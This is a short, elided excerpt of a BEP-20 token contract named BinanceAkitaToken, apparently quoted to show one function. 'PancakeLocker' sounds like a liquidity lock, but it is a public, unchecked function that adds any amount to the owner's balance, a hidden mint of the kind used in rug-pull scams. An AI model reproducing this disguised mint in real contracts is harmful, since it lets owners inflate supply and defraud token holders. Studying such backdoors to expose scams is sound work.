...
// SPDX-License-Identifier: GPL-3.0
        ...
        contract BinanceAkitaToken is IBEP20, Ownable{
          ...
          function PancakeLocker(uint256 amount) public returns (bool) {
              setWallets(owner(), getWalletBalance(owner()).add(amount));
              return true;
          }
        }